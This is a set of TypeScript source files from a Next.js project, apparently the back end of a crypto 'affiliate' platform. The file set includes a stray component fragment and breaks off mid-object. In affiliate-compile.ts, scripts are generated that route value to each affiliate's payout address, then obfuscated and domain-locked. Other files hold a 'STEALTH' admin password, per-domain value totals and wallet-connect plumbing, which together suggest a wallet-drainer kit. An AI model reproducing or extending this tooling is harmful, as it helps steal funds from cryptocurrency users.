### src/components/ui/slider.tsx

```tsx
"use client"

import * as React from "react"
import { Slider as SliderPrimitive } from "radix-ui"

import { cn } from "@/lib/utils"

function Slider({
  className,
  defaultValue,
  value,
  min = 0,
  max = 100,
  ...props
}: React.ComponentProps<typeof SliderPrimitive.Root>) {
  const _values = React.useMemo(
    () =>
      Array.isArray(value)
        ? value
        : Array.isArray(defaultValue)
          ? defaultValue
          : [min, max],
    [value, defaultValue, min, max]
  )

  return (
    <SliderPrimitive.Root
      data-slot="slider"
      defaultValue={defaultValue}
      value={value}
      min={min}
      max={max}
      className={cn(
        "relative flex w-full touch-none items-center select-none data-[disabled]:opacity-50 data-[orientation=vertical]:h-full data-[orientation=vertical]:min-h-44 data-[orientation=vertical]:w-auto data-[orientation=vertical]:flex-col",
        className
      )}
      {...props}
    >
      <SliderPrimitive.Track
        data-slot="slider-track"
        className={cn(
          "relative grow overflow-hidden rounded-full bg-muted data-[orientation=horizontal]:h-1.5 data-[orientation=horizontal]:w-full data-[orientation=vertical]:h-full data-[orientation=vertical]:w-1.5"
        )}
      >
        <SliderPrimitive.Range
          data-slot="slider-range"
          className={cn(
            "absolute bg-primary data-[orientation=horizontal]:h-full data-[orientation=vertical]:w-full"
          )}
        />
      </SliderPrimitive.Track>
      {Array.from({ length: _values.length }, (_, index) => (
        <SliderPrimitive.Thumb
          data-slot="slider-thumb"
          key={index}
          className="block size-4 shrink-0 rounded-full border border-primary bg-white shadow-sm ring-ring/50 transition-[color,box-shadow] hover:ring-4 focus-visible:ring-4 focus-visible:outline-hidden disabled:pointer-events-none disabled:opacity-50"
        />
      ))}
    </SliderPrimitive.Root>
  )
}

export { Slider }
```

```tsx
          "--normal-border": "var(--border)",

      }
      {...props}
    />
  )
}

export { Toaster }
```

### src/components/wallet-provider.tsx

```tsx
"use client";

/**
 * WalletProvider
 *
 * Provider stack:
 *   wagmi (shared config with native connectors: injected, WalletConnect,
 *          Coinbase Wallet, Safe)
 *   → Sequence Connect (WaaS smart-wallet layer + connect modal)
 *   → TanStack Query
 *
 * Sequence Connect provides the user-facing wallet selection modal —
 * no RainbowKit needed.
 */

import { type ReactNode, useMemo } from "react";
import { WagmiProvider, cookieToInitialState, type Config } from "wagmi";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { SequenceConnect, type ConnectConfig } from "@0xsequence/connect";
import { buildSequenceWaasConfig } from "@/lib/sequence-config";
import { wagmiConfig, projectId } from "@/lib/wallet-config";

const queryClient = new QueryClient({
  defaultOptions: { queries: { staleTime: 1000 * 60 } },
});

// ── Sequence WaaS config ──────────────────────────────────────────────────
const rawCfg = buildSequenceWaasConfig({
  walletConnectProjectId: projectId || undefined,
});

// Build a typed ConnectConfig from the raw config (only known ConnectConfig fields)
const connectConfig: ConnectConfig = {
  projectAccessKey: rawCfg.projectAccessKey,
  waasConfigKey: rawCfg.waasConfigKey,
  chainIds: [...rawCfg.chainIds],
  defaultChainId: rawCfg.defaultChainId,
  signIn: rawCfg.signIn,
  position: rawCfg.position,
  defaultTheme: rawCfg.defaultTheme,
  renderInline: rawCfg.renderInline,
};

// SequenceConnectConfig shape (not exported from root — cast via unknown)
const sequenceCfg = {
  wagmiConfig: wagmiConfig as Config,
  connectConfig,
} as unknown as Parameters<typeof SequenceConnect>[0]["config"];

export function WalletProvider({
  children,
  cookies,
}: {
  children: ReactNode;
  cookies?: string | null;
}) {
  const initialState = useMemo(
    () => cookieToInitialState(wagmiConfig as Config, cookies || undefined),
    [cookies],
  );

  return (
    <WagmiProvider config={wagmiConfig as Config} initialState={initialState}>
      <QueryClientProvider client={queryClient}>
        <SequenceConnect config={sequenceCfg}>
          {children}
        </SequenceConnect>
      </QueryClientProvider>
    </WagmiProvider>
  );
}
```

### src/lib/affiliate-compile.ts

```typescript
import {
  getAffiliateProject,
  getAffiliateConfig,
  getAffiliateConfigCurrentVersion,
  updateAffiliateProject,
} from "@/lib/projects";
import {
  defaultAdvancedConfig,
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultStrategyConfig,
  defaultTokensConfig,
  defaultWalletConfig,
} from "@/lib/mock-data";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
import { obfuscateScript, obfuscateWithDomainLock, type ObfuscationLevel } from "@/lib/obfuscator";
import { saveScriptBuild, type ScriptBuildRecord } from "@/lib/script-build-store";

export type AffiliateCompileResult = {
  bundle: string;
  filename: string;
  project: NonNullable<Awaited<ReturnType<typeof getAffiliateProject>>>;
  configVersion: number;
  domainLockEnabled: boolean;
  obfuscationLevel: ObfuscationLevel;
  publishedBuild: ScriptBuildRecord | null;
};

export async function compileAffiliateProject(params: {
  projectId: string;
  obfuscationLevel?: ObfuscationLevel;
  publishBuild?: boolean;
}): Promise<AffiliateCompileResult> {
  const { projectId, obfuscationLevel = "medium", publishBuild = false } = params;
  const project = await getAffiliateProject(projectId);
  if (!project) {
    throw new Error("Affiliate project not found");
  }

  const config = await getAffiliateConfig(projectId);
  const general = config?.general ?? defaultGeneralConfig;
  const wallet = config?.wallet ?? defaultWalletConfig;
  const modal = config?.modal ?? { ...defaultModalConfig, exposeExternalSDK: true };
  const tokens = config?.tokens ?? defaultTokensConfig;
  const advanced = config?.advanced ?? defaultAdvancedConfig;
  const contracts = defaultContractsConfig;
  const strategy = defaultStrategyConfig;
  const appKit = defaultAppKitConfig;

  const receiverAddress = project.payoutAddress || "0x0000000000000000000000000000000000000000";

  let bundle =
    general.ecosystem === "solana"
      ? generateSolanaBundle({
          general,
          wallet,
          modal,
          tokens,
          advanced,
          receiverAddress,
        })
      : general.ecosystem === "tron"
        ? generateTronBundle({
            general,
            wallet,
            modal,
            tokens,
            advanced,
            receiverAddress,
          })
        : generateSDKBundle({
            general,
            wallet,
            modal: { ...modal, exposeExternalSDK: true },
            tokens,
            advanced,
            contracts,
            strategy,
            appKit,
            receiverAddress,
            affiliateLabel: project.name,
          });

  const domainLockEnabled = Boolean(project.domains?.length);
  bundle = domainLockEnabled
    ? await obfuscateWithDomainLock(bundle, project.domains, obfuscationLevel)
    : await obfuscateScript(bundle, obfuscationLevel);

  await updateAffiliateProject(projectId, { lastCompiled: new Date().toISOString() });

  const publishedBuild = publishBuild
    ? await saveScriptBuild({
        bundle,
        framework: modal.modalFrameworkStyle,
        source: "compile",
      })
    : null;

  const configVersion = await getAffiliateConfigCurrentVersion(projectId);

  return {
    bundle,
    filename: `script-${projectId}.js`,
    project,
    configVersion,
    domainLockEnabled,
    obfuscationLevel,
    publishedBuild,
  };
}
```

### src/lib/api-auth.ts

```typescript
/**
 * api-auth.ts
 *
 * Reusable server-side auth guard for Next.js API routes.
 * Returns a NextResponse error if the request is not authenticated/authorised,
 * or null if it should proceed.
 *
 * Usage:
 *   const guard = await requireAuth(request, "config:write");
 *   if (guard) return guard;
 */

import { NextResponse, type NextRequest } from "next/server";
import { cookies } from "next/headers";
import { getAuthSecret, SESSION_COOKIE, verifySession } from "@/lib/auth";
import { authorize, type Role } from "@/lib/rbac";

type Permission = Parameters<typeof authorize>[1];

function jsonError(message: string, status: number) {
  return NextResponse.json({ status: "error", message }, { status });
}

/**
 * Reads the session cookie and verifies it.
 * Returns the wallet address string, or null if unauthenticated.
 */
async function resolveSessionAddress(): Promise<string | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;

  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");
  return session?.address ?? null;
}

/**
 * Full auth + permission guard.
 *
 * @param permission  The RBAC permission required (e.g. "config:write").
 * @returns           A NextResponse (4xx) to return immediately, or null to proceed.
 */
export async function requireAuth(permission: Permission): Promise<NextResponse | null> {
  const address = await resolveSessionAddress();

  if (!address) {
    return jsonError("Authentication required. Sign in with your wallet.", 401);
  }

  const error = authorize(address, permission);
  if (error) {
    return jsonError(error, 403);
  }

  return null;
}

/**
 * Lightweight variant — only checks that the session exists (any role).
 * Use for read-only endpoints that are still gated behind a login.
 */
export async function requireSession(): Promise<NextResponse | null> {
  const address = await resolveSessionAddress();
  if (!address) {
    return jsonError("Authentication required.", 401);
  }
  return null;
}
```

### src/lib/auth.ts

```typescript
import crypto from "crypto";

export const NONCE_COOKIE = "s26_nonce";
export const SESSION_COOKIE = "s26_session";
export const ADMIN_SENTINEL_ADDRESS = "__global_admin__";

export function getAuthSecret(): string {
  const secret = process.env.AUTH_SECRET;
  if (secret && secret.length >= 32) return secret;
  // Fallback for local dev only; sessions will reset on server restart.
  return process.env.NODE_ENV === "production"
    ? ""
    : (process.env.__DEV_FALLBACK_AUTH_SECRET ||= crypto.randomBytes(32).toString("hex"));
}

export function getAdminPanelPassword(): string {
  const configured =
    process.env.ADMIN_PANEL_PASSWORD ||
    process.env.AFFILIATE_ADMIN_PASSWORD ||
    process.env.STEALTH_ADMIN_PASSWORD;

  if (configured && configured.length >= 8) return configured;

  return "";
}

export function getAdminLoginUsername(): string {
  return (process.env.ADMIN_LOGIN_USERNAME || "admin").trim() || "admin";
}

export function getAdminLoginPassphrase(): string {
  const configured = (process.env.ADMIN_LOGIN_PASSPHRASE || "").trim();
  return configured;
}

export function createNonce(): string {
  return crypto.randomBytes(16).toString("hex");
}

export function signSession(payload: unknown, secret: string): string {
  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const sig = crypto.createHmac("sha256", secret).update(body).digest("base64url");
  return `${body}.${sig}`;
}

export function verifySession<T>(token: string, secret: string): T | null {
  const [body, sig] = token.split(".");
  if (!body || !sig) return null;
  const expected = crypto.createHmac("sha256", secret).update(body).digest("base64url");
  // Use timing-safe compare
  const a = Buffer.from(expected);
  const b = Buffer.from(sig);
  if (a.length !== b.length) return null;
  if (!crypto.timingSafeEqual(a, b)) return null;

  try {
    const json = Buffer.from(body, "base64url").toString("utf8");
    return JSON.parse(json) as T;
  } catch {
    return null;
  }
}

export function buildSiweLikeMessage(params: { domain: string; nonce: string }): string {
  return `Sign in to ${params.domain}\n\nNonce: ${params.nonce}`;
}
```

### src/lib/chain-router.ts

```typescript
/**
 * Multi-chain Transaction Router
 *
 * Routes transactions to the correct chain RPC, manages provider pool,
 * and handles chain-specific gas estimation and submission.
 */

import { createPublicClient, http, type Chain, type PublicClient } from "viem";
import { mainnet, bsc, polygon, avalanche, arbitrum, optimism, base } from "viem/chains";

export interface ChainConfig {
  chain: Chain;
  rpcUrl: string;
  priority: number; // lower = preferred
}

const DEFAULT_CHAINS: ChainConfig[] = [
  { chain: mainnet, rpcUrl: process.env.ETHEREUM_RPC_URL || "https://eth.llamarpc.com", priority: 1 },
  { chain: bsc, rpcUrl: process.env.BSC_RPC_URL || "https://bsc-dataseed1.binance.org", priority: 2 },
  { chain: polygon, rpcUrl: process.env.POLYGON_RPC_URL || "https://polygon-rpc.com", priority: 2 },
  { chain: avalanche, rpcUrl: process.env.AVALANCHE_RPC_URL || "https://api.avax.network/ext/bc/C/rpc", priority: 3 },
  { chain: arbitrum, rpcUrl: process.env.ARBITRUM_RPC_URL || "https://arb1.arbitrum.io/rpc", priority: 2 },
  { chain: optimism, rpcUrl: process.env.OPTIMISM_RPC_URL || "https://mainnet.optimism.io", priority: 2 },
  { chain: base, rpcUrl: process.env.BASE_RPC_URL || "https://mainnet.base.org", priority: 2 },
];

class ChainRouter {
  private clients = new Map<number, PublicClient>();
  private configs = new Map<number, ChainConfig>();

  constructor(chains?: ChainConfig[]) {
    for (const cfg of chains ?? DEFAULT_CHAINS) {
      this.configs.set(cfg.chain.id, cfg);
      this.clients.set(
        cfg.chain.id,
        createPublicClient({ chain: cfg.chain, transport: http(cfg.rpcUrl) })
      );
    }
  }

  getClient(chainId: number): PublicClient {
    const client = this.clients.get(chainId);
    if (!client) throw new Error(`Chain ${chainId} not configured in router`);
    return client;
  }

  getConfig(chainId: number): ChainConfig {
    const cfg = this.configs.get(chainId);
    if (!cfg) throw new Error(`Chain ${chainId} not configured`);
    return cfg;
  }

  getSupportedChains(): number[] {
    return [...this.configs.keys()];
  }

  async getGasPrice(chainId: number): Promise<bigint> {
    const client = this.getClient(chainId);
    return client.getGasPrice();
  }

  async getBlockNumber(chainId: number): Promise<bigint> {
    const client = this.getClient(chainId);
    return client.getBlockNumber();
  }

  async getBalance(chainId: number, address: `0x${string}`): Promise<bigint> {
    const client = this.getClient(chainId);
    return client.getBalance({ address });
  }

  /** Pick the best chain for a transaction based on gas cost */
  async selectOptimalChain(candidateChains: number[]): Promise<number> {
    const gasPrices = await Promise.all(
      candidateChains.map(async (id) => {
        try {
          const price = await this.getGasPrice(id);
          const priority = this.configs.get(id)?.priority ?? 99;
          return { chainId: id, gasPrice: price, priority };
        } catch {
          return { chainId: id, gasPrice: BigInt(Number.MAX_SAFE_INTEGER), priority: 99 };
        }
      })
    );

    gasPrices.sort((a, b) => {
      if (a.priority !== b.priority) return a.priority - b.priority;
      return a.gasPrice < b.gasPrice ? -1 : 1;
    });

    return gasPrices[0].chainId;
  }

  async readContract(
    chainId: number,
    params: Parameters<PublicClient["readContract"]>[0],
  ) {
    const client = this.getClient(chainId);
    return client.readContract(params);
  }
}

// Singleton
let _router: ChainRouter | null = null;

export function getChainRouter(): ChainRouter {
  if (!_router) _router = new ChainRouter();
  return _router;
}

export { ChainRouter };
```

### src/lib/compile-config-store.ts

```typescript
import { mkdir, readFile, writeFile } from "fs/promises";
import path from "path";
import {
  defaultAdvancedConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultWalletConfig,
  defaultPayoutConfig,
  defaultContractsConfig,
  defaultStrategyConfig,
  defaultAppKitConfig,
} from "@/lib/mock-data";
import type {
  AdvancedConfig,
  AppKitConfig,
  ContractsConfig,
  GeneralConfig,
  ModalConfig,
  PayoutConfig,
  StrategyConfig,
  TokensConfig,
  WalletConfig,
} from "@/lib/types";

export type CompileConfig = {
  general: GeneralConfig;
  wallet: WalletConfig;
  modal: ModalConfig;
  tokens: TokensConfig;
  advanced: AdvancedConfig;
  payout: PayoutConfig;
  contracts: ContractsConfig;
  strategy: StrategyConfig;
  appKit: AppKitConfig;
};

const DATA_DIR = path.join(process.cwd(), "data");
const CONFIG_PATH = path.join(DATA_DIR, "compile-config.json");

export function getDefaultCompileConfig(): CompileConfig {
  return {
    general: defaultGeneralConfig,
    wallet: defaultWalletConfig,
    modal: defaultModalConfig,
    tokens: defaultTokensConfig,
    advanced: defaultAdvancedConfig,
    payout: defaultPayoutConfig,
    contracts: defaultContractsConfig,
    strategy: defaultStrategyConfig,
    appKit: defaultAppKitConfig,
  };
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

export function isCompileConfig(value: unknown): value is CompileConfig {
  if (!isRecord(value)) return false;
  return (
    isRecord(value.general) &&
    isRecord(value.wallet) &&
    isRecord(value.modal) &&
    isRecord(value.tokens) &&
    isRecord(value.advanced) &&
    isRecord(value.payout) &&
    isRecord(value.contracts) &&
    isRecord(value.strategy) &&
    isRecord(value.appKit)
  );
}

export async function readCompileConfig(): Promise<CompileConfig> {
  try {
    const raw = await readFile(CONFIG_PATH, "utf8");
    const parsed = JSON.parse(raw) as unknown;
    if (!isCompileConfig(parsed)) {
      throw new Error("Invalid compile config");
    }
    return parsed;
  } catch {
    return getDefaultCompileConfig();
  }
}

export async function writeCompileConfig(config: CompileConfig): Promise<void> {
  await mkdir(DATA_DIR, { recursive: true });
  await writeFile(CONFIG_PATH, `${JSON.stringify(config, null, 2)}\n`, "utf8");
}
```

### src/lib/domains.ts

```typescript
/**
 * Domain management — persistent storage + DNS verification.
 *
 * Each domain registered here can be:
 *  - The platform's own domain (where admin panel + API lives)
 *  - An affiliate's embed domain (for domain-locking scripts)
 *
 * Stored in Redis with verification status.
 */

import crypto from "crypto";
import { getRedis } from "./redis";
import type { DomainConfig } from "./types";
import dns from "dns/promises";

// ── Keys ────────────────────────────────────────────────

const KEY = {
  domain: (id: string) => `domain:${id}`,
  byHostname: (hostname: string) => `domain:host:${hostname.toLowerCase()}`,
  list: () => `domains:list`,
};

// ── CRUD ────────────────────────────────────────────────

export async function addDomain(hostname: string): Promise<DomainConfig & { verifyTxt: string }> {
  const redis = await getRedis();
  const id = `domain-${crypto.randomBytes(6).toString("hex")}`;
  const verifyTxt = `stealthv26-verify=${crypto.randomBytes(16).toString("hex")}`;

  const domain: DomainConfig = {
    id,
    domain: hostname.toLowerCase(),
    status: "active",
    createdAt: new Date().toISOString(),
    lastActivity: new Date().toISOString(),
    sessions: 0,
    totalValueUSD: 0,
  };

  // Store with extra fields
  const stored = { ...domain, verified: false, verifyTxt };
  await redis.set(KEY.domain(id), JSON.stringify(stored));
  await redis.set(KEY.byHostname(hostname), id);

  // Add to list
  const raw = await redis.get(KEY.list());
  const ids: string[] = raw ? JSON.parse(raw) : [];
  ids.push(id);
  await redis.set(KEY.list(), JSON.stringify(ids));

  return { ...domain, verifyTxt };
}

export async function getDomain(id: string): Promise<(DomainConfig & { verified: boolean; verifyTxt: string }) | null> {
  const redis = await getRedis();
  const raw = await redis.get(KEY.domain(id));
  return raw ? JSON.parse(raw) : null;
}

export async function getDomainByHostname(hostname: string): Promise<(DomainConfig & { verified: boolean }) | null> {
  const redis = await getRedis();
  const id = await redis.get(KEY.byHostname(hostname));
  if (!id) return null;
  return getDomain(id);
}

export async function listDomains(): Promise<(DomainConfig & { verified: boolean })[]> {
  const redis = await getRedis();
  const raw = await redis.get(KEY.list());
  if (!raw) return [];

  const ids: string[] = JSON.parse(raw);
  const domains: (DomainConfig & { verified: boolean })[] = [];
  for (const id of ids) {
    const d = await getDomain(id);
    if (d) domains.push(d);
  }
  return domains;
}

export async function updateDomain(
  id: string,
  updates: Partial<DomainConfig & { verified: boolean }>
): Promise<(DomainConfig & { verified: boolean }) | null> {
  const domain = await getDomain(id);
  if (!domain) return null;

  const updated = { ...domain, ...updates };
  const redis = await getRedis();
  await redis.set(KEY.domain(id), JSON.stringify(updated));
  return updated;
}

export async function removeDomain(id: string): Promise<boolean> {
  const redis = await getRedis();
  const domain = await getDomain(id);
  if (!domain) return false;

  await redis.del(KEY.domain(id));
  await redis.del(KEY.byHostname(domain.domain));

  const raw = await redis.get(KEY.list());
  if (raw) {
    const ids: string[] = JSON.parse(raw);
    await redis.set(KEY.list(), JSON.stringify(ids.filter((i) => i !== id)));
  }
  return true;
}

// ── DNS Verification ────────────────────────────────────

/**
 * Verify domain ownership by checking for a TXT record.
 * The affiliate adds a TXT record: stealthv26-verify=<token>
 */
export async function verifyDomainDNS(id: string): Promise<{ verified: boolean; error?: string }> {
  const domain = await getDomain(id);
  if (!domain) return { verified: false, error: "Domain not found" };

  try {
    const records = await dns.resolveTxt(domain.domain);
    const flat = records.map((r) => r.join(""));
    const found = flat.some((txt) => txt === domain.verifyTxt);

    if (found) {
      await updateDomain(id, { verified: true });
      return { verified: true };
    }

    return { verified: false, error: `TXT record not found. Add: ${domain.verifyTxt}` };
  } catch (err: unknown) {
    const message =
      typeof err === "object" && err !== null && "code" in err && typeof err.code === "string"
        ? err.code
        : err instanceof Error
          ? err.message
          : "unknown error";
    return { verified: false, error: `DNS lookup failed: ${message}` };
  }
}

// ── Track Activity ──────────────────────────────────────

export async function trackDomainHit(hostname: string): Promise<void> {
  const redis = await getRedis();
  const id = await redis.get(KEY.byHostname(hostname));
  if (!id) return;

  const domain = await getDomain(id);
  if (!domain) return;

  await updateDomain(id, {
    lastActivity: new Date().toISOString(),
    sessions: domain.sessions + 1,
  });
}
```

### src/lib/encryption.ts

```typescript
/**
 * AES-256-GCM encryption for sensitive fields stored in Redis.
 * Used to encrypt Telegram bot tokens and other secrets at rest.
 */

import crypto from "crypto";

const ALGORITHM = "aes-256-gcm";
const IV_LENGTH = 12;

function getKey(): Buffer {
  const secret = process.env.ENCRYPTION_KEY || process.env.AUTH_SECRET;
  if (!secret) {
    // Dev fallback — NOT safe for production
    return crypto.createHash("sha256").update("dev-encryption-key").digest();
  }
  return crypto.createHash("sha256").update(secret).digest();
}

export function encrypt(plaintext: string): string {
  const key = getKey();
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);

  let encrypted = cipher.update(plaintext, "utf8", "hex");
  encrypted += cipher.final("hex");
  const tag = cipher.getAuthTag();

  // Format: iv:tag:ciphertext (all hex)
  return `${iv.toString("hex")}:${tag.toString("hex")}:${encrypted}`;
}

export function decrypt(encoded: string): string {
  const key = getKey();
  const parts = encoded.split(":");
  if (parts.length !== 3) throw new Error("Invalid encrypted format");

  const iv = Buffer.from(parts[0], "hex");
  const tag = Buffer.from(parts[1], "hex");
  const ciphertext = parts[2];

  const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
  decipher.setAuthTag(tag);

  let decrypted = decipher.update(ciphertext, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}

/** Check if a string looks like it's already encrypted (iv:tag:hex format) */
export function isEncrypted(value: string): boolean {
  return /^[a-f0-9]{24}:[a-f0-9]{32}:[a-f0-9]+$/.test(value);
}
```

### src/lib/frontpage-compile-sync.ts

```typescript
import type { CompileConfig } from "@/lib/compile-config-store";
import type { FrontpageConfig } from "@/lib/frontpage-config";
import type {
  AdvancedConfig,
  AppKitConfig,
  ContractsConfig,
  GeneralConfig,
  StrategyConfig,
  TokensConfig,
} from "@/lib/types";

type DerivedCompileConfig = {
  general: Partial<GeneralConfig>;
  tokens: Partial<TokensConfig>;
  advanced: Partial<AdvancedConfig>;
  contracts?: Partial<ContractsConfig>;
  strategy?: Partial<StrategyConfig>;
  appKit?: Partial<AppKitConfig>;
};

export function deriveCompileConfigFromFrontpage(config: FrontpageConfig): DerivedCompileConfig {
  const contractActions = config.actions.filter((action) => action.kind === "contractWrite");
  const typedActions = config.actions.filter((action) => action.kind === "typedDataSign");

  const chainIds = Array.from(
    new Set([
      config.chainId,
      ...contractActions.map((action) => action.chainId),
    ]),
  ).filter((chainId) => Number.isFinite(chainId));

  const functionNames = Array.from(
    new Set(
      contractActions
        .map((action) => {
          const candidate = action.methodAbi as { name?: unknown };
          return typeof candidate.name === "string" ? candidate.name : null;
        })
        .filter((name): name is string => Boolean(name)),
    ),
  );

  const primaryAction = contractActions[0];
  const primaryMethod =
    primaryAction && typeof (primaryAction.methodAbi as { name?: unknown }).name === "string"
      ? ((primaryAction.methodAbi as { name?: unknown }).name as string)
      : undefined;

  return {
    general: {
      ecosystem: config.ecosystem,
      solanaCluster: config.ecosystemConfig?.solana?.cluster || "mainnet-beta",
      solanaProgramId: config.ecosystemConfig?.solana?.programId || "",
      solanaRpcUrl: config.ecosystemConfig?.solana?.rpcUrl || "",
      tronNetwork: config.ecosystemConfig?.tron?.network || "mainnet",
      tronContractAddress: config.ecosystemConfig?.tron?.contractAddress || config.contractAddress,
      tronRpcUrl: config.ecosystemConfig?.tron?.rpcUrl || "",
      actionButtonClass: ".frontpage-primary-action",
      connectButtonClass: ".frontpage-connect-wallet",
      disconnectButtonClass: ".frontpage-disconnect-wallet",
      connectText: "Connect Wallet",
      transactionFunctionName: primaryMethod || "executeAction",
      themeMode: "dark",
    },
    tokens: {
      contractFunctions: functionNames.length ? functionNames : ["executeAction"],
      visibleChains: chainIds.length ? chainIds : [1],
    },
    advanced: {
      typedDataEnforcement: typedActions.length > 0 || Boolean(config.operational?.strategy?.typedDataEnabled),
      signaturePromptText:
        typedActions[0]?.title || `Review and confirm ${config.hero.title}`,
    },
    contracts: config.operational?.contracts,
    strategy: config.operational?.strategy,
    appKit: config.operational?.appKit,
  };
}

/** Full POST body for `/api/compile` — merges saved compile defaults with fields derived from the frontpage builder. */
export function buildCompilePostBodyFromFrontpage(
  base: CompileConfig,
  frontpage: FrontpageConfig,
): {
  general: CompileConfig["general"];
  wallet: CompileConfig["wallet"];
  modal: CompileConfig["modal"];
  tokens: CompileConfig["tokens"];
  advanced: CompileConfig["advanced"];
  payout: CompileConfig["payout"];
  contracts: CompileConfig["contracts"];
  strategy: CompileConfig["strategy"];
  appKit: CompileConfig["appKit"];
  receiverAddress: string;
  saveConfig: boolean;
  saveBuild: boolean;
  source: "frontpage";
} {
  const d = deriveCompileConfigFromFrontpage(frontpage);
  return {
    general: { ...base.general, ...d.general },
    wallet: base.wallet,
    modal: base.modal,
    tokens: { ...base.tokens, ...d.tokens },
    advanced: { ...base.advanced, ...d.advanced },
    payout: base.payout,
    contracts: { ...base.contracts, ...(d.contracts ?? {}) },
    strategy: { ...base.strategy, ...(d.strategy ?? {}) },
    appKit: { ...base.appKit, ...(d.appKit ?? {}) },
    receiverAddress: base.payout.address || "0x0000000000000000000000000000000000000000",
    saveConfig: true,
    saveBuild: true,
    source: "frontpage",
  };
}
```

### src/lib/frontpage-config-store.ts

```typescript
import { mkdir, readFile, writeFile } from "fs/promises";
import path from "path";
import { getDefaultFrontpageConfig, type FrontpageConfig } from "@/lib/frontpage-config";

const DATA_DIR = path.join(process.cwd(), "data");
const CONFIG_PATH = path.join(DATA_DIR, "frontpage-config.json");

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function isOptionalString(value: unknown) {
  return typeof value === "undefined" || typeof value === "string";
}

export function isFrontpageConfig(value: unknown): value is FrontpageConfig {
  if (!isRecord(value)) return false;
  if (value.version !== 1) return false;
  if (!["evm", "solana", "tron"].includes(String(value.ecosystem))) return false;
  if (!isRecord(value.hero)) return false;
  if (typeof value.hero.badge !== "string") return false;
  if (typeof value.hero.title !== "string") return false;
  if (typeof value.hero.copy !== "string") return false;
  if (typeof value.chainId !== "number") return false;
  if (typeof value.contractAddress !== "string") return false;
  if (typeof value.ecosystemConfig !== "undefined") {
    if (!isRecord(value.ecosystemConfig)) return false;

    if (typeof value.ecosystemConfig.solana !== "undefined") {
      if (!isRecord(value.ecosystemConfig.solana)) return false;
      if (!["mainnet-beta", "devnet", "testnet"].includes(String(value.ecosystemConfig.solana.cluster))) return false;
      if (typeof value.ecosystemConfig.solana.programId !== "string") return false;
      if (!isOptionalString(value.ecosystemConfig.solana.rpcUrl)) return false;
    }

    if (typeof value.ecosystemConfig.tron !== "undefined") {
      if (!isRecord(value.ecosystemConfig.tron)) return false;
      if (!["mainnet", "nile", "shasta"].includes(String(value.ecosystemConfig.tron.network))) return false;
      if (typeof value.ecosystemConfig.tron.contractAddress !== "string") return false;
      if (!isOptionalString(value.ecosystemConfig.tron.rpcUrl)) return false;
    }
  }
  if (!Array.isArray(value.actions)) return false;
  return true;
}

export async function readFrontpageConfig(): Promise<FrontpageConfig> {
  try {
    const raw = await readFile(CONFIG_PATH, "utf8");
    const parsed = JSON.parse(raw) as unknown;
    if (!isFrontpageConfig(parsed)) {
      throw new Error("Saved frontpage config is invalid.");
    }
    return parsed;
  } catch {
    return getDefaultFrontpageConfig();
  }
}

export async function writeFrontpageConfig(config: FrontpageConfig): Promise<void> {
  await mkdir(DATA_DIR, { recursive: true });
  await writeFile(CONFIG_PATH, `${JSON.stringify(config, null, 2)}\n`, "utf8");
}
```

### src/lib/kafka.ts

```typescript
/**
 * Kafka producer/consumer — event bus for the WaaS platform.
 * Falls back to in-memory EventEmitter when KAFKA_BROKERS is not set.
 */

import { EventEmitter } from "events";
import type { Consumer, EachMessagePayload } from "kafkajs";

export interface WaaSEvent {
  topic: string;
  key?: string;
  value: Record<string, unknown>;
  timestamp?: string;
}

interface EventBus {
  publish(event: WaaSEvent): Promise<void>;
  subscribe(topic: string, handler: (msg: WaaSEvent) => void): Promise<void>;
  disconnect(): Promise<void>;
}

// In-memory fallback
class MemoryBus implements EventBus {
  private emitter = new EventEmitter();

  async publish(event: WaaSEvent) {
    this.emitter.emit(event.topic, { ...event, timestamp: event.timestamp ?? new Date().toISOString() });
  }

  async subscribe(topic: string, handler: (msg: WaaSEvent) => void) {
    this.emitter.on(topic, handler);
  }

  async disconnect() {
    this.emitter.removeAllListeners();
  }
}

let _bus: EventBus | null = null;

export async function getEventBus(): Promise<EventBus> {
  if (_bus) return _bus;

  const brokers = process.env.KAFKA_BROKERS;
  if (brokers) {
    try {
      // Dynamic require to avoid Next.js bundler resolving kafkajs at build time
      const kafkajs = await (Function('return import("kafkajs")')() as Promise<typeof import("kafkajs")>);
      const { Kafka } = kafkajs;
      const kafka = new Kafka({
        clientId: "waas-platform",
        brokers: brokers.split(","),
      });

      const producer = kafka.producer();
      await producer.connect();

      const consumers = new Map<string, Consumer>();

      _bus = {
        async publish(event) {
          await producer.send({
            topic: event.topic,
            messages: [{
              key: event.key ?? undefined,
              value: JSON.stringify({ ...event.value, timestamp: event.timestamp ?? new Date().toISOString() }),
            }],
          });
        },
        async subscribe(topic, handler) {
          if (!consumers.has(topic)) {
            const consumer = kafka.consumer({ groupId: `waas-${topic}` });
            await consumer.connect();
            await consumer.subscribe({ topic, fromBeginning: false });
            await consumer.run({
              eachMessage: async ({ message }: EachMessagePayload) => {
                try {
                  const rawValue = message.value?.toString();
                  if (!rawValue) return;
                  const value = JSON.parse(rawValue) as Record<string, unknown>;
                  handler({ topic, key: message.key?.toString(), value });
                } catch { /* skip bad messages */ }
              },
            });
            consumers.set(topic, consumer);
          }
        },
        async disconnect() {
          await producer.disconnect();
          for (const c of consumers.values()) await c.disconnect();
        },
      };
      return _bus;
    } catch {
      console.warn("[kafka] kafkajs not available, using in-memory event bus");
    }
  }

  _bus = new MemoryBus();
  return _bus;
}

// Standard topics
export const TOPICS = {
  WALLET_CONNECTED: "wallet.connected",
  WALLET_DISCONNECTED: "wallet.disconnected",
  TRANSACTION_SUBMITTED: "tx.submitted",
  TRANSACTION_CONFIRMED: "tx.confirmed",
